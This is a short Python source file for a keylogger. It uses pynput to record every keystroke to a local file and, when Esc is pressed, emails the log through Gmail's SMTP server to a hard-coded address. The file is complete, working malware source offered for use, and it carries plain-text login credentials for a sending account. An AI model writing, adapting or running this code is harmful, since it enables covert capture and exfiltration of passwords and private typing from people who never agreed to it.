from pynput.keyboard import Listener        #importing dependencies
import smtplib


def writefile(key):                         #function which will convert unicode to string
    try:
        letter = str(key)
        letter = letter.replace("'", "")
        if letter == "key.APOSTROPHE":      #replacing few strokes for ease of readibility
            letter = "'"
        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.enter':
            letter = '\n'
        if letter == 'Key.shift':
            letter = ''
        if letter == 'Key.tab':
            letter = '\n'
        if letter == 'Key.backspace':
            letter = ' back '
        if letter == 'Key.caps_lock':
            letter = ''
        if letter == 'shift_r':
            letter = ''
        if letter == 'Key.ctrl_l':
            letter = ''
        if letter == 'Key.alt_l':
            letter = ''
        if letter == 'Key.alt_r':
            letter = ''
        if letter == 'Key.ctrl_r':
            letter = ''
        if letter == 'Key.shift_r':
            letter = ''
        if letter == 'Key.esc':             #intercepting to trigger transmit function
            letter = ''
            transmit()
        with open('log.txt', 'a') as f:     #writing each letter in a file named log.txt
            f.write(letter)
    except KeyError:                        #handling error
        pass


def transmit():                             #function to mail the file
    sender_mail = "usingfortest1234@gmail.com"
    receive_mail = "harsh22701@gmail.com"
    password = 'testingpurpose1234'
    with open("log.txt", 'r') as re:        #reading fromm file
        message = re.read()
    server = smtplib.SMTP('smtp.gmail.com', 587)    #establishing connection with gmail server
    server.ehlo()
    server.starttls()
    server.login(sender_mail, password)             #authenticating ourselves
    server.sendmail(sender_mail, receive_mail, message)     #sending mail
    server.close()                          #terminating the connection


with Listener(on_press=writefile) as lis:   #calling listener and listening to each and every press
    lis.join()                              #finally joining all the letters
